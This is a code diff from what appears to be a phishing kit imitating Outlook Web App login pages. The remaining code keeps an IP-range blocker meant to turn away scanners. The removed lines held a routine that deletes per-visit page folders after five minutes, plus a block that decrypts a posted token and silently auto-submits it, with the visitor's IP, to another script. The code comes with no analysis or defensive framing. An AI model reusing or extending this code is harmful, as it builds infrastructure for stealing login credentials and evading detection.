@@ -36,7 +36,7 @@ div img {
  </body>
 </html>
 <?php
-error_reporting(0);
+//error_reporting(0);
 include('engine/encrypt.php');
 //blocker
 include 'ip_in_range2.php';
@@ -72,76 +72,4 @@ foreach ($ips as $ip)
         exit;
     }
 }
-//require 'block.php';
-//delete old files
-$files = glob(getcwd().'/*'); // get all file names
-	foreach($files as $file){ // iterate files
-	  	if(is_dir($file)) {
-			if($file==getcwd().'/domain'  || $file==getcwd().'/engine'  || $file==getcwd().'/office'  || $file==getcwd().'/funcs' || $file==getcwd().'/newowa' || $file==getcwd().'/oldowa') {
-				// do nothing
-			}
-			else {
-//check time
-if (filemtime($file) < time() - 300) {
-rrmdir($file);}
-			}
-		}
-		
-		else if(is_file($file)) {
-			if($file==getcwd().'.htaccess' || $file==getcwd().'/blocker.php' || 
-			$file==getcwd().'/delete.php' || $file==getcwd().'/error_log' || $file==getcwd().'/config.php' || 
-			$file==getcwd().'/geoplugin.class.php' || $file==getcwd().'/verify.php' || $file==getcwd().'/visitors.txt' || $file==getcwd().'/visits.csv' ||
-			$file==getcwd().'/recopy.php' || 
-			$file==getcwd().'/robots.txt'|| 
-			$file==getcwd().'/Settings.php'|| 
-			$file==getcwd().'/request.php') {
-				// do nothing
-			}
-			else {
-//check time
-if (filemtime($file) < time() - 300) {
-	    			unlink(getcwd().'/'.$file);
-header("Location: $redirect");}
-			}
-		}
-	}
-	function rrmdir($dir) { 
-		if (is_dir($dir)) { 
-			$objects = scandir($dir); 
-			foreach ($objects as $object) { 
-				if ($object != "." && $object != "..") { 
-					if (is_dir($dir."/".$object))
-						rrmdir($dir."/".$object);
-					else
-						unlink($dir."/".$object); 
-				} 
-			}
-			//check time
-if (filemtime($file) < time() - 300) {
-rmdir($dir); }
-		} 
-	}
-//run normal things
-function gettoken(){
-foreach($_POST as $key => $value){
-  return $value;
-}}
-$rawtoken = doDecrypt(gettoken());
-    if (isset($rawtoken))
-{?>
-<form action="recopy.php" method="post" id="dateForm">
-<input type="hidden" name="token" value="<?php echo $rawtoken; ?>">
-<input type="hidden" name="ip" value="<?php echo $_POST['ip']; ?>">
-</form>
 
-<script type="text/javascript">
-    document.getElementById('dateForm').submit(); // SUBMIT FORM
-</script>
-
-<?php 
-}
-else
-{
-header("location: ../../");
-}
-?>
